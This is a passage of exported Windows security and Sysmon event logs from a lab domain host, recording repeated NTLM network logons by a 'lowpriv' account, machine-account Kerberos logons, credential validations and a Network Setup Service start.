	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"127.0.0.1"	50480	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x647715	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109963	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:01:40.343"	"XRC_b54ByrYY_kgL9e51"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:01:41.888"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-3984567624-304424726-3877085034-1103
	Account Name:		lowpriv
	Account Domain:		LAB2019
	Logon ID:		0x6475AC
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.218
	Source Port:		42686

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	NTLM	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.218"	42686	128	"NTLM V2"	"{00000000-0000-0000-0000-000000000000}"	" - "	"NtLmSsp "	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	LAB2019	0x0	0x6475ac	"'-"	"'-"	lowpriv	"S-1-5-21-3984567624-304424726-3877085034-1103"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,136"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109956	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:01:40.343"	"XBC_b54ByrYY_kgL9e51"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Credential Validation"	4776	"May 28, 2026 @ 21:01:41.888"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"The computer attempted to validate the credentials for an account.

Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account:	lowpriv
Source Workstation:	
Error Code:	0x0"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	lowpriv	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4776	"Audit Success"	Info	644	"3,136"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109955	"Credential Validation"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:01:18.048"	"WxC_b54ByrYY_kgLne5b"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	None	7036	"May 28, 2026 @ 21:01:19.335"	event	" - "	"Service Control Manager"	"WIN-JOCP945SK51.lab2019.local"	information	"The Network Setup Service service entered the stopped state."	wineventlog	System	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	4E0065007400530065007400750070005300760063002F0031000000	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"Network Setup Service"	stopped	7036	Classic	Info	636	"2,492"	"{555908d1-a6d7-4695-8e1e-26931d2012f4}"	"Service Control Manager"	11028	None	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:00:49.732"	"WhC_b54ByrYY_kgLCu71"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:00:50.862"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x64669B
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	127.0.0.1
	Source Port:		50476

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"127.0.0.1"	50476	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x64669b	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"2,120"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109933	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:00:40.339"	"WRC_b54ByrYY_kgLCu71"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:00:41.856"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-3984567624-304424726-3877085034-1103
	Account Name:		lowpriv
	Account Domain:		LAB2019
	Logon ID:		0x6464C6
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.218
	Source Port:		37212

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	NTLM	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.218"	37212	128	"NTLM V2"	"{00000000-0000-0000-0000-000000000000}"	" - "	"NtLmSsp "	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	LAB2019	0x0	0x6464c6	"'-"	"'-"	lowpriv	"S-1-5-21-3984567624-304424726-3877085034-1103"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"4,888"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109926	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:00:40.339"	"WBC_b54ByrYY_kgLCu71"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Credential Validation"	4776	"May 28, 2026 @ 21:00:41.856"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"The computer attempted to validate the credentials for an account.

Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account:	lowpriv
Source Workstation:	
Error Code:	0x0"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	lowpriv	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4776	"Audit Success"	Info	644	"4,888"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109925	"Credential Validation"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:59:49.727"	"GxC-b54ByrYY_kgLIO5y"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:59:50.827"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x6455E9
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	127.0.0.1
	Source Port:		50473

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"127.0.0.1"	50473	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x6455e9	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109897	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:59:45.073"	"GBC-b54ByrYY_kgLIO5y"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	None	7036	"May 28, 2026 @ 20:59:46.289"	event	" - "	"Service Control Manager"	"WIN-JOCP945SK51.lab2019.local"	information	"The Network Setup Service service entered the running state."	wineventlog	System	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	4E0065007400530065007400750070005300760063002F0034000000	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"Network Setup Service"	running	7036	Classic	Info	636	"6,352"	"{555908d1-a6d7-4695-8e1e-26931d2012f4}"	"Service Control Manager"	11027	None	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:59:45.061"	"GhC-b54ByrYY_kgLIO5y"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 20:59:47.028"	event	" - "	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 17:59:45.059
ProcessGuid: {6e4a868b-8291-6a18-2201-000000002500}
ProcessId: 7000
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-6f3b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-6f3b-6a18-0b00-000000002500}
ParentProcessId: 636
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	" - "	" - "	" - "	" - "	"{6e4a868b-6f3b-6a18-e703-000000000000}"	0x3e7	" - "	" - "	" - "	" - "	" - "	" - "	"svchost.exe"	" - "	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-6f3b-6a18-0b00-000000002500}"	636	"NT AUTHORITY\SYSTEM"	"{6e4a868b-8291-6a18-2201-000000002500}"	7000	" - "	"Microsoft® Windows® Operating System"	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0	" - "	"NT AUTHORITY\SYSTEM"	"2026-05-28 17:59:45.059"	" - "	" - "	" - "	" - "	1	" - "	Info	"3,112"	"2,560"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	18884	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 20:59:45.058"	"GRC-b54ByrYY_kgLIO5y"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:59:46.824"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x27c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Negotiate	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"'-"	"'-"	0	"'-"	"{00000000-0000-0000-0000-000000000000}"	" - "	"Advapi  "	5	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x27c	"C:\Windows\System32\services.exe"	" - "	" - "	"'-"	" - "	" - "	LAB2019	0x3e7	"WIN-JOCP945SK51$"	"S-1-5-18"	"NT AUTHORITY"	0x0	0x3e7	"'-"	"'-"	SYSTEM	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"4,076"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109890	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:59:40.322"	"FxC-b54ByrYY_kgLIO5y"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:59:41.821"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-3984567624-304424726-3877085034-1103
	Account Name:		lowpriv
	Account Domain:		LAB2019
	Logon ID:		0x63F3AA
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.218
	Source Port:		49624

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	NTLM	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.218"	49624	128	"NTLM V2"	"{00000000-0000-0000-0000-000000000000}"	" - "	"NtLmSsp "	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	LAB2019	0x0	0x63f3aa	"'-"	"'-"	lowpriv	"S-1-5-21-3984567624-304424726-3877085034-1103"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"4,076"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109887	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:59:40.322"	"FhC-b54ByrYY_kgLIO5y"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Credential Validation"	4776	"May 28, 2026 @ 20:59:41.821"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"The computer attempted to validate the credentials for an account.

Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account:	lowpriv
Source Workstation:	
